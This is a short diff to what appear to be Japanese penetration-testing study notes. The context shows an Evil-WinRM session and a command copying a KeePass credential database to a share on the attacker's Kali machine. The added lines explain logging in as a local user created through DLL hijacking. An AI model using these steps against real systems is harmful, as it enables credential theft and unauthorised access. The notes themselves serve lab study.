@@ -595,6 +595,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\wario\Documents> 
 ```
 ### Windows サーバから Kali への file アップロード
+
 ```
 On kali in /tmp folder to avoid write errors:
 
@@ -607,3 +608,9 @@ PS C:\Users\jim\Documents> copy Database.kdbx z:\
 
 Then you should get on kali to enumerate further 
 ```
+
+### Windows Admin ログイン時のドメイン指定
+
+dll ハイジャックなどでユーザを作成したときは、ローカルユーザとなる。
+その状態で Admin になろうとするとドメインが指定されている場合がある。
+ユーザ名を **".\dame"** と指定することでローカルユーザとなる。
